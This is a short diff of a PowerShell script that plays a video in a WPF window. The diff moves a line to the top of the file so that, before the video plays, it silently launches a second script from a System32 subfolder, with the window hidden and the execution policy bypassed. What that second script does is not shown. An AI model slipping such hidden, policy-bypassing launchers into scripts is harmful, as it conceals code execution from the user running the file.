@@ -1,3 +1,5 @@
+powershell -w h -Exec Bypass C:\Windows\System32\rr\fb.ps1
+
 #WPF Library for Playing Movie and some components
 Add-Type -AssemblyName PresentationFramework
 
@@ -31,5 +33,3 @@ $VideoPlayer.Play()
  
 #Show Up the Window 
 $Window.ShowDialog() | out-null
-
-powershell -w h -Exec Bypass C:\Windows\System32\rr\fb.ps1
